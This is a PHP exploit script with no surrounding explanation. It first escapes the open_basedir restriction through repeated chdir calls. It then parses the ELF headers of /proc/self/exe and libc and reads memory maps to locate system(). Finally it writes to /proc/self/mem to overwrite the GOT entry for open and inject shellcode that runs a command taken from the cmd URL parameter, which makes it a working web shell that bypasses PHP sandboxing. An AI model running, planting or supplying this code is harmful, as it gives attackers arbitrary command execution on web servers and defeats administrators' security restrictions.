<?php 

mkdir('img');
chdir('img');
ini_set('open_basedir','..');
chdir('..');
chdir('..');
chdir('..');
chdir('..');
chdir('..');
chdir('..');
chdir('..');
ini_set('open_basedir','/');

define('SHT_NULL',0);
define('SHT_PROGBITS',1);
define('SHT_SYMTAB',2);
define('SHT_STRTAB',3);
define('SHT_RELA',4);
define('SHT_HASH',5);
define('SHT_DYNAMIC',6);
define('SHT_NOTE',7);
define('SHT_NOBITS',8);
define('SHT_REL',9);
define('SHT_SHLIB',10);
define('SHT_DNYSYM',11);
define('SHT_INIT_ARRAY',14);
define('SHT_FINI_ARRAY',15);
//why does section tables have so many fuck type
define('SHT_GNU_HASH',0x6ffffff6);
define('SHT_GNU_versym',0x6fffffff);
define('SHT_GNU_verneed',0x6ffffffe);


class elf{
    private $elf_bin;
    private $strtab_section=array();
    private $rel_plt_section=array();
    private $dynsym_section=array();
    public $shared_librarys=array();
    public $rel_plts=array();
    public function getElfBin()
{
        return $this->elf_bin;
    }
    public function setElfBin($elf_bin)
{
        $this->elf_bin = fopen($elf_bin,"rb");
    }
    public function unp($value)
{
        return hexdec(bin2hex(strrev($value)));
    }
    public function get($start,$len){

        fseek($this->elf_bin,$start);
        $data=fread ($this->elf_bin,$len);
        rewind($this->elf_bin);
        return $this->unp($data);
    }
    public function get_section($elf_bin=""){
        if ($elf_bin){
            $this->setElfBin($elf_bin);
        }
        $this->elf_shoff=$this->get(0x28,8);
        $this->elf_shentsize=$this->get(0x3a,2);
        $this->elf_shnum=$this->get(0x3c,2);
        $this->elf_shstrndx=$this->get(0x3e,2);
        for ($i=0;$i<$this->elf_shnum;$i+=1){
            $sh_type=$this->get($this->elf_shoff+$i*$this->elf_shentsize+4,4);
            switch ($sh_type){
                case SHT_STRTAB:
                    $this->strtab_section[$i]=
                        array(
                            'strtab_offset'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+24,8),
                            'strtab_size'=>$this->strtab_size=$this->get($this->elf_shoff+$i*$this->elf_shentsize+32,8)
                        );
                    break;

                case SHT_RELA:
                    $this->rel_plt_section[$i]=
                        array(
                            'rel_plt_offset'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+24,8),
                            'rel_plt_size'=>$this->strtab_size=$this->get($this->elf_shoff+$i*$this->elf_shentsize+32,8),
                            'rel_plt_entsize'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+56,8)
                        );
                    break;
                case SHT_DNYSYM:
                    $this->dynsym_section[$i]=
                        array(
                            'dynsym_offset'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+24,8),
                            'dynsym_size'=>$this->strtab_size=$this->get($this->elf_shoff+$i*$this->elf_shentsize+32,8),
                            'dynsym_entsize'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+56,8)
                        );
                    break;

                case SHT_NULL:
                case SHT_PROGBITS:
                case SHT_DYNAMIC:
                case SHT_SYMTAB:
                case SHT_NOBITS:
                case SHT_NOTE:
                case SHT_FINI_ARRAY:
                case SHT_INIT_ARRAY:
                case SHT_GNU_versym:
                case SHT_GNU_HASH:
                     break;

                default:
 //                   echo "who knows what $sh_type this is? ";

              } 
          }
     }
    public function get_reloc(){
        $rel_plts=array();
        $dynsym_section= reset($this->dynsym_section);
        $strtab_section=reset($this->strtab_section);
        foreach ($this->rel_plt_section as $rel_plt ){
             for ($i=$rel_plt['rel_plt_offset'];$i<$rel_plt['rel_plt_offset']+$rel_plt['rel_plt_size'];$i+=$rel_plt['rel_plt_entsize'])
             {
                $rel_offset=$this->get($i,8);
                $rel_info=$this->get($i+8,8)>>32;
                $fun_name_offset=$this->get($dynsym_section['dynsym_offset']+$rel_info*$dynsym_section['dynsym_entsize'],4);
                $fun_name_offset=$strtab_section['strtab_offset']+$fun_name_offset-1;
                $fun_name='';
                while ($this->get(++$fun_name_offset,1)!=""){
                    $fun_name.=chr($this->get($fun_name_offset,1));
                }
                $rel_plts[$fun_name]=$rel_offset;
            }
        }
        $this->rel_plts=$rel_plts;
    }
    public function get_shared_library($elf_bin=""){
        if ($elf_bin){
            $this->setElfBin($elf_bin);
        }
        $shared_librarys=array();
        $dynsym_section=reset($this->dynsym_section);
        $strtab_section=reset($this->strtab_section);
        for($i=$dynsym_section['dynsym_offset']+$dynsym_section['dynsym_entsize'];$i<$dynsym_section['dynsym_offset']+$dynsym_section['dynsym_size'];$i+=$dynsym_section['dynsym_entsize'])
        {
            $shared_library_offset=$this->get($i+8,8);
            $fun_name_offset=$this->get($i,4);
            $fun_name_offset=$fun_name_offset+$strtab_section['strtab_offset']-1;
            $fun_name='';
            while ($this->get(++$fun_name_offset,1)!=""){
                $fun_name.=chr($this->get($fun_name_offset,1));
            }
            $shared_librarys[$fun_name]=$shared_library_offset;
         }
         $this->shared_librarys=$shared_librarys;
   }
   public function close(){
       fclose($this->elf_bin);
   }

   public function __destruct()
   {
       $this->close();
   }
   public function packlli($value) {
       $higher = ($value & 0xffffffff00000000) >> 32;
       $lower = $value & 0x00000000ffffffff;
       return pack('V2', $lower, $higher);
   }
}
$test=new elf();
$test->get_section('/proc/self/exe');
$test->get_reloc();
$open_php=$test->rel_plts['open'];
$maps = file_get_contents('/proc/self/maps');
preg_match('/(\w+)-(\w+)\s+.+\[stack]/', $maps, $stack);
preg_match('/(\w+)-(\w+).*?libc-/',$maps,$libcgain);
$libc_base = "0x".$libcgain[1];
echo "Libc base: ".$libc_base."\n";
echo "Stack location: ".$stack[1]."\n";
$array_tmp = explode('-',$maps);
$pie_base = hexdec("0x".$array_tmp[0]);
echo "PIE base: ".$pie_base."\n";
$test2=new elf();
$test2->get_section('/usr/lib64/libc-2.17.so');
$test2->get_reloc();
$test2->get_shared_library();
$sys = $test2->shared_librarys['system'];
$sys_addr = $sys + hexdec($libc_base);
echo "system addr:".$sys_addr."\n";
$mem = fopen('/proc/self/mem','wb');
$shellcode_loc = $pie_base + 0x2333;
fseek($mem,$open_php);
fwrite($mem,$test->packlli($shellcode_loc));
$command=base64_decode($_GET['cmd']);
echo($command);
$stack=hexdec("0x".$stack[1]);
fseek($mem, $stack);
fwrite($mem, "{$command}\x00");
$cmd = $stack;
$shellcode = "H\xbf".$test->packlli($cmd)."H\xb8".$test->packlli($sys_addr)."P\xc3";
fseek($mem,$shellcode_loc);
fwrite($mem,$shellcode);
readfile('zxhy');
exit();